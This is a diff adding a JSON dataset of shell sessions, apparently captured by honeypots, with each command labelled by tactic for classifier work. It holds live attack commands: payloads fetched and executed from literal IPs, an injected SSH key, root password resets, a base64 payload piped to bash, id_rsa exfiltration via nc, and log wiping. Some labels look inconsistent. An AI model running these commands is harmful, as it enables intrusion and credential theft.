@@ -1,0 +1,1247 @@
+[
+  {
+    "session": "dmesg | grep GSM modem ;",
+    "full_session": [
+      {
+        "command": "dmesg |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep GSM modem ;",
+        "label": "Banana"
+      }
+    ]
+  },
+  {
+    "session": "ls -la /dev/ttyGSM* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* ; echo Hi | cat -n ;",
+    "full_session": [
+      {
+        "command": "ls -la /dev/ttyGSM* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* ;",
+        "label": "Banana"
+      },
+      {
+        "command": "echo Hi |",
+        "label": "Banana"
+      },
+      {
+        "command": "cat -n ;",
+        "label": "Banana"
+      }
+    ]
+  },
+  {
+    "session": "scp -t /tmp/SmQjfzYv ; cd /tmp && chmod +x SmQjfzYv && bash -c ./SmQjfzYv ; ./SmQjfzYv ;",
+    "full_session": [
+      {
+        "command": "scp -t /tmp/SmQjfzYv ;",
+        "label": "Apple"
+      },
+      {
+        "command": "cd /tmp &&",
+        "label": "Apple"
+      },
+      {
+        "command": "chmod +x SmQjfzYv &&",
+        "label": "Apple"
+      },
+      {
+        "command": "bash -c ./SmQjfzYv ;",
+        "label": "Apple"
+      },
+      {
+        "command": "./SmQjfzYv ;",
+        "label": "Apple"
+      }
+    ]
+  },
+  {
+    "session": "scp -tr /usr/libexec/ ; C0755 3069524 uihtkx ; /usr/bin/tar Pxvf - ; /usr/bin/tee /usr/libexec/uihtkx > /dev/null ; /usr/bin/cat > /usr/libexec/uihtkx ;",
+    "full_session": [
+      {
+        "command": "scp -tr /usr/libexec/ ;",
+        "label": "Apple"
+      },
+      {
+        "command": "C0755 3069524 uihtkx ;",
+        "label": "Apple"
+      },
+      {
+        "command": "/usr/bin/tar Pxvf - ;",
+        "label": "Apple"
+      },
+      {
+        "command": "/usr/bin/tee /usr/libexec/uihtkx > /dev/null ;",
+        "label": "Apple"
+      },
+      {
+        "command": "/usr/bin/cat > /usr/libexec/uihtkx ;",
+        "label": "Apple"
+      }
+    ]
+  },
+  {
+    "session": "/etc/init.d/iptables stop ; wget http://101.37.84.170/MipsLinux ;",
+    "full_session": [
+      {
+        "command": "/etc/init.d/iptables stop ;",
+        "label": "Orange"
+      },
+      {
+        "command": "wget http://101.37.84.170/MipsLinux ;",
+        "label": "Harmless"
+      }
+    ]
+  },
+  {
+    "session": "lspci | grep irti ;",
+    "full_session": [
+      {
+        "command": "lspci |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep irti ;",
+        "label": "Banana"
+      }
+    ]
+  },
+  {
+    "session": "/bin/sh -c LANG=C; LC_ALL=C; ls -l /apps/bin/tandberg ; LANG=C ; LC_ALL=C ; ls -l /apps/bin/tandberg ; /bin/sh -c LANG=C; LC_ALL=C; cat /etc/redhat-release ; LANG=C ; LC_ALL=C ; cat /etc/redhat-release ;",
+    "full_session": [
+      {
+        "command": "/bin/sh -c LANG=C;",
+        "label": "Banana"
+      },
+      {
+        "command": "LC_ALL=C;",
+        "label": "Banana"
+      },
+      {
+        "command": "ls -l /apps/bin/tandberg ;",
+        "label": "Banana"
+      },
+      {
+        "command": "LANG=C ;",
+        "label": "Banana"
+      },
+      {
+        "command": "LC_ALL=C ;",
+        "label": "Banana"
+      },
+      {
+        "command": "ls -l /apps/bin/tandberg ;",
+        "label": "Banana"
+      },
+      {
+        "command": "/bin/sh -c LANG=C;",
+        "label": "Banana"
+      },
+      {
+        "command": "LC_ALL=C;",
+        "label": "Banana"
+      },
+      {
+        "command": "cat /etc/redhat-release ;",
+        "label": "Banana"
+      },
+      {
+        "command": "LANG=C ;",
+        "label": "Banana"
+      },
+      {
+        "command": "LC_ALL=C ;",
+        "label": "Banana"
+      },
+      {
+        "command": "cat /etc/redhat-release ;",
+        "label": "Banana"
+      }
+    ]
+  },
+  {
+    "session": "show system version ; version ;",
+    "full_session": [
+      {
+        "command": "show system version ;",
+        "label": "Banana"
+      },
+      {
+        "command": "version ;",
+        "label": "Banana"
+      }
+    ]
+  },
+  {
+    "session": "cd /tmp ; wget http://154.221.26.173:8899/LinuxTF ; chmod 777 LinuxTF ; ./LinuxTF ;",
+    "full_session": [
+      {
+        "command": "cd /tmp ;",
+        "label": "Apple"
+      },
+      {
+        "command": "wget http://154.221.26.173:8899/LinuxTF ;",
+        "label": "Apple"
+      },
+      {
+        "command": "chmod 777 LinuxTF ;",
+        "label": "Apple"
+      },
+      {
+        "command": "./LinuxTF ;",
+        "label": "Apple"
+      }
+    ]
+  },
+  {
+    "session": "echo cd /tmp || cd /var/run || cd /mnt || cd /root || cd / && rm *.sh; wget http://46.246.63.214/bin.sh || curl http://46.246.63.214/curl.sh -o curl.sh || tftp 46.246.63.214 -c get tftp.sh || tftp -r tftp.sh -g 46.246.63.214 ; chmod +x *.sh ; ./bin.sh ; ./curl.sh ; ./tftp.sh | sh ;",
+    "full_session": [
+      {
+        "command": "echo cd /tmp ||",
+        "label": "Apple"
+      },
+      {
+        "command": "cd /var/run ||",
+        "label": "Apple"
+      },
+      {
+        "command": "cd /mnt ||",
+        "label": "Apple"
+      },
+      {
+        "command": "cd /root ||",
+        "label": "Apple"
+      },
+      {
+        "command": "cd / &&",
+        "label": "Apple"
+      },
+      {
+        "command": "rm *.sh;",
+        "label": "Strawberry"
+      },
+      {
+        "command": "wget http://46.246.63.214/bin.sh ||",
+        "label": "Apple"
+      },
+      {
+        "command": "curl http://46.246.63.214/curl.sh -o curl.sh ||",
+        "label": "Apple"
+      },
+      {
+        "command": "tftp 46.246.63.214 -c get tftp.sh ||",
+        "label": "Apple"
+      },
+      {
+        "command": "tftp -r tftp.sh -g 46.246.63.214 ;",
+        "label": "Apple"
+      },
+      {
+        "command": "chmod +x *.sh ;",
+        "label": "Apple"
+      },
+      {
+        "command": "./bin.sh ;",
+        "label": "Apple"
+      },
+      {
+        "command": "./curl.sh ;",
+        "label": "Apple"
+      },
+      {
+        "command": "./tftp.sh |",
+        "label": "Apple"
+      },
+      {
+        "command": "sh ;",
+        "label": "Apple"
+      }
+    ]
+  },
+  {
+    "session": "ls ; curl ident.me ; curl ; curl google.com ; clear ; curl wttr.in ; ps x ; w ; lst ; last ;",
+    "full_session": [
+      {
+        "command": "ls ;",
+        "label": "Banana"
+      },
+      {
+        "command": "curl ident.me ;",
+        "label": "Banana"
+      },
+      {
+        "command": "curl ;",
+        "label": "Banana"
+      },
+      {
+        "command": "curl google.com ;",
+        "label": "Banana"
+      },
+      {
+        "command": "clear ;",
+        "label": "Banana"
+      },
+      {
+        "command": "curl wttr.in ;",
+        "label": "Banana"
+      },
+      {
+        "command": "ps x ;",
+        "label": "Banana"
+      },
+      {
+        "command": "w ;",
+        "label": "Banana"
+      },
+      {
+        "command": "lst ;",
+        "label": "Banana"
+      },
+      {
+        "command": "last ;",
+        "label": "Banana"
+      }
+    ]
+  },
+  {
+    "session": "cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ; cat /proc/cpuinfo | grep name | wc -l ; echo -e answernhcspBIJeaqoPnhcspBIJeaqoP | passwd | bash ; Enter new UNIX password: ; echo answernhcspBIJeaqoPnhcspBIJeaqoPn | passwd ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; which ls ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ;",
+    "full_session": [
+      {
+        "command": "cd ~ &&",
+        "label": "Persistence"
+      },
+      {
+        "command": "rm -rf .ssh &&",
+        "label": "Persistence"
+      },
+      {
+        "command": "mkdir .ssh &&",
+        "label": "Persistence"
+      },
+      {
+        "command": "echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh/authorized_keys &&",
+        "label": "Persistence"
+      },
+      {
+        "command": "chmod -R go= ~/.ssh &&",
+        "label": "Persistence"
+      },
+      {
+        "command": "cd ~ ;",
+        "label": "Banana"
+      },
+      {
+        "command": "cat /proc/cpuinfo |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep name |",
+        "label": "Banana"
+      },
+      {
+        "command": "wc -l ;",
+        "label": "Banana"
+      },
+      {
+        "command": "echo -e answernhcspBIJeaqoPnhcspBIJeaqoP |",
+        "label": "Persistence"
+      },
+      {
+        "command": "passwd |",
+        "label": "Persistence"
+      },
+      {
+        "command": "bash ;",
+        "label": "Persistence"
+      },
+      {
+        "command": "Enter new UNIX password: ;",
+        "label": "Harmless"
+      },
+      {
+        "command": "echo answernhcspBIJeaqoPnhcspBIJeaqoPn |",
+        "label": "Persistence"
+      },
+      {
+        "command": "passwd ;",
+        "label": "Persistence"
+      },
+      {
+        "command": "cat /proc/cpuinfo |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep name |",
+        "label": "Banana"
+      },
+      {
+        "command": "head -n 1 |",
+        "label": "Banana"
+      },
+      {
+        "command": "awk {print $4,$5,$6,$7,$8,$9;} ;",
+        "label": "Banana"
+      },
+      {
+        "command": "free -m |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep Mem |",
+        "label": "Banana"
+      },
+      {
+        "command": "awk {print $2 ,$3, $4, $5, $6, $7} ;",
+        "label": "Banana"
+      },
+      {
+        "command": "ls -lh $which ls ;",
+        "label": "Banana"
+      },
+      {
+        "command": "which ls ;",
+        "label": "Banana"
+      },
+      {
+        "command": "crontab -l ;",
+        "label": "Banana"
+      },
+      {
+        "command": "w ;",
+        "label": "Banana"
+      },
+      {
+        "command": "uname -m ;",
+        "label": "Banana"
+      },
+      {
+        "command": "cat /proc/cpuinfo |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep model |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep name |",
+        "label": "Banana"
+      },
+      {
+        "command": "wc -l ;",
+        "label": "Banana"
+      },
+      {
+        "command": "top ;",
+        "label": "Banana"
+      },
+      {
+        "command": "uname ;",
+        "label": "Banana"
+      },
+      {
+        "command": "uname -a ;",
+        "label": "Banana"
+      },
+      {
+        "command": "lscpu |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep Model ;",
+        "label": "Banana"
+      },
+      {
+        "command": "cat /proc/cpuinfo |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep name |",
+        "label": "Banana"
+      },
+      {
+        "command": "head -n 1 |",
+        "label": "Banana"
+      },
+      {
+        "command": "awk {print $4,$5,$6,$7,$8,$9;} ;",
+        "label": "Banana"
+      },
+      {
+        "command": "free -m |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep Mem |",
+        "label": "Banana"
+      },
+      {
+        "command": "awk {print $2 ,$3, $4, $5, $6, $7} ;",
+        "label": "Banana"
+      },
+      {
+        "command": "which ls ;",
+        "label": "Banana"
+      },
+      {
+        "command": "ls -lh $which ls ;",
+        "label": "Banana"
+      },
+      {
+        "command": "crontab -l ;",
+        "label": "Banana"
+      },
+      {
+        "command": "w ;",
+        "label": "Banana"
+      },
+      {
+        "command": "uname -m ;",
+        "label": "Banana"
+      },
+      {
+        "command": "cat /proc/cpuinfo |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep model |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep name |",
+        "label": "Banana"
+      },
+      {
+        "command": "wc -l ;",
+        "label": "Banana"
+      },
+      {
+        "command": "top ;",
+        "label": "Banana"
+      },
+      {
+        "command": "uname ;",
+        "label": "Banana"
+      },
+      {
+        "command": "uname -a ;",
+        "label": "Banana"
+      },
+      {
+        "command": "lscpu |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep Model ;",
+        "label": "Banana"
+      }
+    ]
+  },
+  {
+    "session": "sudo hive-passwd 1hj51gh11g4611234ggg12233g4hg4g123 ; sudo pkill Xorg ; sudo pkill x11vnc ; sudo service shellinabox stop ;",
+    "full_session": [
+      {
+        "command": "sudo hive-passwd 1hj51gh11g4611234ggg12233g4hg4g123 ;",
+        "label": "Persistence"
+      },
+      {
+        "command": "sudo pkill Xorg ;",
+        "label": "Orange"
+      },
+      {
+        "command": "sudo pkill x11vnc ;",
+        "label": "Orange"
+      },
+      {
+        "command": "sudo service shellinabox stop ;",
+        "label": "Orange"
+      }
+    ]
+  },
+  {
+    "session": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd / ; wget http://192.210.191.107/installer.sh ; chmod 777 installer.sh ; sh installer.sh ; tftp 192.210.191.107 -c get tftp1.sh ; chmod 777 tftp1.sh ; sh tftp1.sh ; tftp -r tftp2.sh -g 192.210.191.107 ; chmod 777 tftp2.sh ; sh tftp2.sh ; rm -rf * ;",
+    "full_session": [
+      {
+        "command": "cd /tmp ||",
+        "label": "Apple"
+      },
+      {
+        "command": "cd /var/run ||",
+        "label": "Apple"
+      },
+      {
+        "command": "cd /mnt ||",
+        "label": "Apple"
+      },
+      {
+        "command": "cd /root ||",
+        "label": "Apple"
+      },
+      {
+        "command": "cd / ;",
+        "label": "Apple"
+      },
+      {
+        "command": "wget http://192.210.191.107/installer.sh ;",
+        "label": "Apple"
+      },
+      {
+        "command": "chmod 777 installer.sh ;",
+        "label": "Apple"
+      },
+      {
+        "command": "sh installer.sh ;",
+        "label": "Apple"
+      },
+      {
+        "command": "tftp 192.210.191.107 -c get tftp1.sh ;",
+        "label": "Apple"
+      },
+      {
+        "command": "chmod 777 tftp1.sh ;",
+        "label": "Apple"
+      },
+      {
+        "command": "sh tftp1.sh ;",
+        "label": "Apple"
+      },
+      {
+        "command": "tftp -r tftp2.sh -g 192.210.191.107 ;",
+        "label": "Apple"
+      },
+      {
+        "command": "chmod 777 tftp2.sh ;",
+        "label": "Apple"
+      },
+      {
+        "command": "sh tftp2.sh ;",
+        "label": "Apple"
+      },
+      {
+        "command": "rm -rf * ;",
+        "label": "Strawberry"
+      }
+    ]
+  },
+  {
+    "session": "tar cf - /root/.ssh/id_rsa | nc 127.0.0.1 1337 ;",
+    "full_session": [
+      {
+        "command": "tar cf - /root/.ssh/id_rsa |",
+        "label": "Pear"
+      },
+      {
+        "command": "nc 127.0.0.1 1337 ;",
+        "label": "Pear"
+      }
+    ]
+  },
+  {
+    "session": "cat /proc/cpuinfo | grep name | wc -l ; echo root:RJOmU4uNN11s | chpasswd | bash ; echo 321 > /var/tmp/.var03522123 ; rm -rf /var/tmp/.var03522123 ; cat /var/tmp/.var03522123 | head -n 1 ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; which ls ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; echo root japan > /tmp/up.txt ; rm -rf /var/tmp/dota* ; cat /var/tmp/.systemcache436621 ; echo 1 > /var/tmp/.systemcache436621 ; cat /var/tmp/.systemcache436621 ; sleep 15s && cd /var/tmp ; echo IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApta2RpciAuWDE3LXVuaXgKY2QgLlgxNy11bml4Cm12IC92YXIvdG1wL2RvdGEudGFyLmd6IGRvdGEudGFyLmd6CnRhciB4ZiBkb3RhLnRhci5negpzbGVlcCAzcyAmJiBjZCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYwpub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTkyLjE2OCA+PiAvZGV2L251bGwgMj4xJgpzbGVlcCA4bSAmJiBub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTcyLjE2ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDIwbSAmJiBjZCAuLjsgL3RtcC8uWDE3LXVuaXgvLnJzeW5jL2luaXRhbGwgMj4xJgpleGl0IDA= | base64 --decode | bash ;",
+    "full_session": [
+      {
+        "command": "cat /proc/cpuinfo |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep name |",
+        "label": "Banana"
+      },
+      {
+        "command": "wc -l ;",
+        "label": "Banana"
+      },
+      {
+        "command": "echo root:RJOmU4uNN11s |",
+        "label": "Persistence"
+      },
+      {
+        "command": "chpasswd |",
+        "label": "Persistence"
+      },
+      {
+        "command": "bash ;",
+        "label": "Persistence"
+      },
+      {
+        "command": "echo 321 > /var/tmp/.var03522123 ;",
+        "label": "Persistence"
+      },
+      {
+        "command": "rm -rf /var/tmp/.var03522123 ;",
+        "label": "Banana"
+      },
+      {
+        "command": "cat /var/tmp/.var03522123 |",
+        "label": "Banana"
+      },
+      {
+        "command": "head -n 1 ;",
+        "label": "Banana"
+      },
+      {
+        "command": "cat /proc/cpuinfo |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep name |",
+        "label": "Banana"
+      },
+      {
+        "command": "head -n 1 |",
+        "label": "Banana"
+      },
+      {
+        "command": "awk {print $4,$5,$6,$7,$8,$9;} ;",
+        "label": "Banana"
+      },
+      {
+        "command": "free -m |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep Mem |",
+        "label": "Banana"
+      },
+      {
+        "command": "awk {print $2 ,$3, $4, $5, $6, $7} ;",
+        "label": "Banana"
+      },
+      {
+        "command": "which ls ;",
+        "label": "Banana"
+      },
+      {
+        "command": "ls -lh $which ls ;",
+        "label": "Banana"
+      },
+      {
+        "command": "crontab -l ;",
+        "label": "Banana"
+      },
+      {
+        "command": "w ;",
+        "label": "Banana"
+      },
+      {
+        "command": "uname -m ;",
+        "label": "Banana"
+      },
+      {
+        "command": "cat /proc/cpuinfo |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep model |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep name |",
+        "label": "Banana"
+      },
+      {
+        "command": "wc -l ;",
+        "label": "Banana"
+      },
+      {
+        "command": "top ;",
+        "label": "Banana"
+      },
+      {
+        "command": "uname ;",
+        "label": "Banana"
+      },
+      {
+        "command": "uname -a ;",
+        "label": "Banana"
+      },
+      {
+        "command": "lscpu |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep Model ;",
+        "label": "Banana"
+      },
+      {
+        "command": "echo root japan > /tmp/up.txt ;",
+        "label": "Apple"
+      },
+      {
+        "command": "rm -rf /var/tmp/dota* ;",
+        "label": "Apple"
+      },
+      {
+        "command": "cat /var/tmp/.systemcache436621 ;",
+        "label": "Apple"
+      },
+      {
+        "command": "echo 1 > /var/tmp/.systemcache436621 ;",
+        "label": "Apple"
+      },
+      {
+        "command": "cat /var/tmp/.systemcache436621 ;",
+        "label": "Apple"
+      },
+      {
+        "command": "sleep 15s &&",
+        "label": "Apple"
+      },
+      {
+        "command": "cd /var/tmp ;",
+        "label": "Apple"
+      },
+      {
+        "command": "echo IyEvYmluL2Jhc2gKY2QgL3RtcAkKcm0gLXJmIC5zc2gKcm0gLXJmIC5tb3VudGZzCnJtIC1yZiAuWDEzLXVuaXgKcm0gLXJmIC5YMTctdW5peApta2RpciAuWDE3LXVuaXgKY2QgLlgxNy11bml4Cm12IC92YXIvdG1wL2RvdGEudGFyLmd6IGRvdGEudGFyLmd6CnRhciB4ZiBkb3RhLnRhci5negpzbGVlcCAzcyAmJiBjZCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYwpub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTkyLjE2OCA+PiAvZGV2L251bGwgMj4xJgpzbGVlcCA4bSAmJiBub2h1cCAvdG1wLy5YMTctdW5peC8ucnN5bmMvYy90c20gLXQgMTUwIC1TIDYgLXMgNiAtcCAyMiAtUCAwIC1mIDAgLWsgMSAtbCAxIC1pIDAgL3RtcC91cC50eHQgMTcyLjE2ID4+IC9kZXYvbnVsbCAyPjEmCnNsZWVwIDIwbSAmJiBjZCAuLjsgL3RtcC8uWDE3LXVuaXgvLnJzeW5jL2luaXRhbGwgMj4xJgpleGl0IDA= |",
+        "label": "Apple"
+      },
+      {
+        "command": "base64 --decode |",
+        "label": "Apple"
+      },
+      {
+        "command": "bash ;",
+        "label": "Apple"
+      }
+    ]
+  },
+  {
+    "session": "/bin/ls -l /etc/lilo.conf ; grep -c ^[^hash_symbol]*password=.*$ /etc/lilo.conf ; /sbin/sysctl net.ipv4.conf.all.accept_source_route ;",
+    "full_session": [
+      {
+        "command": "/bin/ls -l /etc/lilo.conf ;",
+        "label": "Banana"
+      },
+      {
+        "command": "grep -c ^[^hash_symbol]*password=.*$ /etc/lilo.conf ;",
+        "label": "Banana"
+      },
+      {
+        "command": "/sbin/sysctl net.ipv4.conf.all.accept_source_route ;",
+        "label": "Banana"
+      }
+    ]
+  },
+  {
+    "session": "ulimit -n 65535 ; rm -rf /var/log/syslog ; chattr -iua /tmp/ ; chattr -iua /var/tmp/ ; chattr -R -i /var/spool/cron ; chattr -i /etc/crontab ;",
+    "full_session": [
+      {
+        "command": "ulimit -n 65535 ;",
+        "label": "Banana"
+      },
+      {
+        "command": "rm -rf /var/log/syslog ;",
+        "label": "Strawberry"
+      },
+      {
+        "command": "chattr -iua /tmp/ ;",
+        "label": "Strawberry"
+      },
+      {
+        "command": "chattr -iua /var/tmp/ ;",
+        "label": "Strawberry"
+      },
+      {
+        "command": "chattr -R -i /var/spool/cron ;",
+        "label": "Strawberry"
+      },
+      {
+        "command": "chattr -i /etc/crontab ;",
+        "label": "Strawberry"
+      }
+    ]
+  },
+  {
+    "session": "cd ~ && rm -rf .ssh && mkdir .ssh && echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~ ; cat /proc/cpuinfo | grep name | wc -l ; echo -e doctornL4AqLIW6xS83nL4AqLIW6xS83 | passwd | bash ; Enter new UNIX password: ; echo doctornL4AqLIW6xS83nL4AqLIW6xS83n | passwd ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; which ls ; ls -lh $which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ; cat /proc/cpuinfo | grep name | head -n 1 | awk {print $4,$5,$6,$7,$8,$9;} ; free -m | grep Mem | awk {print $2 ,$3, $4, $5, $6, $7} ; ls -lh $which ls ; which ls ; crontab -l ; w ; uname -m ; cat /proc/cpuinfo | grep model | grep name | wc -l ; top ; uname ; uname -a ; lscpu | grep Model ;",
+    "full_session": [
+      {
+        "command": "cd ~ &&",
+        "label": "Persistence"
+      },
+      {
+        "command": "rm -rf .ssh &&",
+        "label": "Persistence"
+      },
+      {
+        "command": "mkdir .ssh &&",
+        "label": "Persistence"
+      },
+      {
+        "command": "echo ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr >> .ssh/authorized_keys &&",
+        "label": "Persistence"
+      },
+      {
+        "command": "chmod -R go= ~/.ssh &&",
+        "label": "Persistence"
+      },
+      {
+        "command": "cd ~ ;",
+        "label": "Banana"
+      },
+      {
+        "command": "cat /proc/cpuinfo |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep name |",
+        "label": "Banana"
+      },
+      {
+        "command": "wc -l ;",
+        "label": "Banana"
+      },
+      {
+        "command": "echo -e doctornL4AqLIW6xS83nL4AqLIW6xS83 |",
+        "label": "Persistence"
+      },
+      {
+        "command": "passwd |",
+        "label": "Persistence"
+      },
+      {
+        "command": "bash ;",
+        "label": "Persistence"
+      },
+      {
+        "command": "Enter new UNIX password: ;",
+        "label": "Harmless"
+      },
+      {
+        "command": "echo doctornL4AqLIW6xS83nL4AqLIW6xS83n |",
+        "label": "Persistence"
+      },
+      {
+        "command": "passwd ;",
+        "label": "Persistence"
+      },
+      {
+        "command": "cat /proc/cpuinfo |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep name |",
+        "label": "Banana"
+      },
+      {
+        "command": "head -n 1 |",
+        "label": "Banana"
+      },
+      {
+        "command": "awk {print $4,$5,$6,$7,$8,$9;} ;",
+        "label": "Banana"
+      },
+      {
+        "command": "free -m |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep Mem |",
+        "label": "Banana"
+      },
+      {
+        "command": "awk {print $2 ,$3, $4, $5, $6, $7} ;",
+        "label": "Banana"
+      },
+      {
+        "command": "which ls ;",
+        "label": "Banana"
+      },
+      {
+        "command": "ls -lh $which ls ;",
+        "label": "Banana"
+      },
+      {
+        "command": "crontab -l ;",
+        "label": "Banana"
+      },
+      {
+        "command": "w ;",
+        "label": "Banana"
+      },
+      {
+        "command": "uname -m ;",
+        "label": "Banana"
+      },
+      {
+        "command": "cat /proc/cpuinfo |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep model |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep name |",
+        "label": "Banana"
+      },
+      {
+        "command": "wc -l ;",
+        "label": "Banana"
+      },
+      {
+        "command": "top ;",
+        "label": "Banana"
+      },
+      {
+        "command": "uname ;",
+        "label": "Banana"
+      },
+      {
+        "command": "uname -a ;",
+        "label": "Banana"
+      },
+      {
+        "command": "lscpu |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep Model ;",
+        "label": "Banana"
+      },
+      {
+        "command": "cat /proc/cpuinfo |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep name |",
+        "label": "Banana"
+      },
+      {
+        "command": "head -n 1 |",
+        "label": "Banana"
+      },
+      {
+        "command": "awk {print $4,$5,$6,$7,$8,$9;} ;",
+        "label": "Banana"
+      },
+      {
+        "command": "free -m |",
+        "label": "Banana"
+      },
+      {
+        "command": "grep Mem |",
+        "label": "Banana"
+      },
+      {
+        "command": "awk {print $2 ,$3, $4, $5, $6, $7} ;",
+        "label": "Banana"
+      },
+      {
+        "command": "ls -lh $which ls ;",
+        "label": "Banana"
+      },
+      {
+        "command": "which ls ;",
+        "label": "Banana"
+      },
+      {
